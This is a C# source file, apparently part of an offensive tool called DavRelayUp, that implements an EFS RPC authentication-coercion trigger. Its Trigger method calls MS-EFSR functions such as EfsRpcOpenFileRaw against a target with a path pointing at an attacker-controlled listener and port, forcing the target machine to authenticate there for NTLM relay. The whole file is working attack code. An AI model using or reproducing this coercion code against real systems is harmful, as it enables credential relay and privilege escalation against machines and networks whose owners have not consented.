using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace DavRelayUp.AuthTrigger
{
    public static class EfsTrigger
    {

        public enum ApiCall
        {
            EfsRpcOpenFileRaw,
            EfsRpcEncryptFileSrv,
            EfsRpcDecryptFileSrv,
            EfsRpcQueryRecoveryAgents,
            EfsRpcQueryUsersOnFile,
            EfsRpcRemoveUsersFromFile
        }

        public static void Trigger(string target, string listener, int port, ApiCall apiCall = ApiCall.EfsRpcOpenFileRaw)
        {
            Console.WriteLine("[+] Coercing System Authentication");
            int result;

            var Efs = new Efs();
            IntPtr hHandle = IntPtr.Zero;
            try
            {
                switch (apiCall)
                {
                    case ApiCall.EfsRpcOpenFileRaw:
                        result = Efs.EfsRpcOpenFileRaw(target, out hHandle, $"\\\\{listener}@{port}/asdf\\test\\Settings.ini", 0);
                        break;

                    case ApiCall.EfsRpcEncryptFileSrv:
                        result = Efs.EfsRpcEncryptFileSrv(target, $"\\\\{listener}@{port}/asdf\\test\\Settings.ini");
                        break;

                    case ApiCall.EfsRpcDecryptFileSrv:
                        result = Efs.EfsRpcDecryptFileSrv(target, $"\\\\{listener}@{port}/asdf\\test\\Settings.ini", 0);
                        break;

                    case ApiCall.EfsRpcQueryRecoveryAgents:
                        result = Efs.EfsRpcQueryRecoveryAgents(target, $"\\\\{listener}@{port}/asdf\\test\\Settings.ini", out hHandle);
                        break;

                    case ApiCall.EfsRpcQueryUsersOnFile:
                        result = Efs.EfsRpcQueryUsersOnFile(target, $"\\\\{listener}@{port}/asdf\\test\\Settings.ini", out hHandle);
                        break;

                    case ApiCall.EfsRpcRemoveUsersFromFile:
                        result = Efs.EfsRpcRemoveUsersFromFile(target, $"\\\\{listener}@{port}/asdf\\test\\Settings.ini", out hHandle);
                        break;

                    default:
                        result = Efs.EfsRpcOpenFileRaw(target, out hHandle, $"\\\\{listener}@{port}/asdf\\test\\Settings.ini", 0);
                        break;
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex);
                return;
            }
        }
    }
}
